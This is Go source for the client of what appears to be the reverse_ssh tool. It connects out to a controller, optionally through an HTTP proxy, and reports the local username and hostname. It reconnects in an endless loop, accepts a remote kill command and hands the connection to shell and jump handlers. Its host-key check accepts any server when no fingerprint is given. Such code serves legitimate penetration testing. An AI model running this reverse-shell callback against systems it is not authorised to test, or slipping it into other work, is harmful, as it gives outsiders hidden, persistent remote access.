package client

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/client/handlers"
	"github.com/NHAS/reverse_ssh/internal/client/keys"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"golang.org/x/crypto/ssh"
)

func WriteHTTPReq(lines []string, conn net.Conn) error {
	lines = append(lines, "") // Add an empty line for completing the HTTP request
	for _, line := range lines {

		n, err := conn.Write([]byte(line + "\r\n"))
		if err != nil {
			return err
		}

		if len(line+"\r\n") < n {
			return io.ErrShortWrite
		}
	}
	return nil
}

func Connect(addr, proxy string, timeout time.Duration) (conn net.Conn, err error) {

	if len(proxy) != 0 {
		log.Println("Setting HTTP proxy address as: ", proxy)

		proxyCon, err := net.DialTimeout("tcp", proxy, timeout)
		if err != nil {
			return conn, err
		}

		if tcpC, ok := proxyCon.(*net.TCPConn); ok {
			tcpC.SetKeepAlivePeriod(2 * time.Hour)
		}

		req := []string{
			fmt.Sprintf("CONNECT %s HTTP/1.1", addr),
			fmt.Sprintf("Host: %s", addr),
		}

		err = WriteHTTPReq(req, proxyCon)
		if err != nil {
			return conn, fmt.Errorf("Unable to connect proxy %s", proxy)
		}

		var responseStatus []byte
		for {
			b := make([]byte, 1)
			_, err := proxyCon.Read(b)
			if err != nil {
				return conn, fmt.Errorf("Reading from proxy failed")
			}
			responseStatus = append(responseStatus, b...)

			if len(responseStatus) > 4 && bytes.Equal(responseStatus[len(responseStatus)-4:], []byte("\r\n\r\n")) {
				break
			}
		}

		if !bytes.Contains(bytes.ToLower(responseStatus), []byte("200 connection established")) {
			parts := bytes.Split(responseStatus, []byte("\r\n"))
			if len(parts) > 1 {
				return proxyCon, fmt.Errorf("Failed to proxy: '%s'", parts[0])
			}
		}

		log.Println("Proxy accepted CONNECT request, connection set up!")

		return proxyCon, nil
	}

	conn, err = net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return conn, err
	}

	if tcpC, ok := conn.(*net.TCPConn); ok {
		tcpC.SetKeepAlivePeriod(2 * time.Hour)
	}

	return
}

func Run(addr, fingerprint, proxyAddr string) {

	sshPriv, sysinfoError := keys.GetPrivateKey()
	if sysinfoError != nil {
		log.Fatal("Getting private key failed: ", sysinfoError)
	}

	l := logger.NewLog("client")

	var username string
	userInfo, sysinfoError := user.Current()
	if sysinfoError != nil {
		l.Warning("Couldnt get username: %s", sysinfoError.Error())
		username = "Unknown"
	} else {
		username = userInfo.Username
	}

	hostname, sysinfoError := os.Hostname()
	if sysinfoError != nil {
		hostname = "Unknown Hostname"
		l.Warning("Couldnt get host name: %s", sysinfoError)
	}

	config := &ssh.ClientConfig{
		User: fmt.Sprintf("%s.%s", username, hostname),
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(sshPriv),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			if fingerprint == "" { // If a server key isnt supplied, fail open. Potentially should change this for more paranoid people
				l.Warning("No server key specified, allowing connection to %s", addr)
				return nil
			}

			if internal.FingerprintSHA256Hex(key) != fingerprint {
				return fmt.Errorf("Server public key invalid, expected: %s, got: %s", fingerprint, internal.FingerprintSHA256Hex(key))
			}

			return nil
		},
		ClientVersion: "SSH-" + internal.Version + "-" + runtime.GOOS + "_" + runtime.GOARCH,
	}

	for { // My take on a golang do {} while loop :P
		log.Println("Connecting to ", addr)
		conn, err := Connect(addr, proxyAddr, config.Timeout)
		if err != nil {

			if errMsg := err.Error(); strings.Contains(errMsg, "missing port in address") {
				log.Fatalf("Unable to connect to TCP invalid address: '%s', %s", addr, errMsg)
			}

			log.Printf("Unable to connect TCP: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}

		realConn := &internal.TimeoutConn{conn, 4 * time.Minute}

		sshConn, chans, reqs, err := ssh.NewClientConn(realConn, addr, config)
		if err != nil {
			realConn.Close()

			log.Printf("Unable to start a new client connection: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}

		log.Println("Successfully connnected", addr)

		go func() {
			for req := range reqs {

				switch req.Type {

				case "kill":
					log.Println("Got kill command, goodbye")
					os.Exit(0)

				case "keepalive-rssh@golang.org":
					req.Reply(false, nil)
					timeout, err := strconv.Atoi(string(req.Payload))
					if err != nil {
						continue
					}

					realConn.Timeout = time.Duration(timeout*2) * time.Second

				default:
					if req.WantReply {
						req.Reply(false, nil)
					}
				}

			}
		}()

		clientLog := logger.NewLog("client")

		//Do not register new client callbacks here, they are actually within the JumpHandler
		//session is handled here as a legacy hangerover from allowing a client who has directly connected to the servers console to run the connect command
		//Otherwise anything else should be done via jumphost syntax -J
		err = internal.RegisterChannelCallbacks(nil, chans, clientLog, map[string]internal.ChannelHandler{
			"session": handlers.ServerConsoleSession(sshConn),
			"jump":    handlers.JumpHandler(sshPriv, sshConn),
		})

		sshConn.Close()

		if err != nil {
			log.Printf("Server disconnected unexpectedly: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}

	}

}
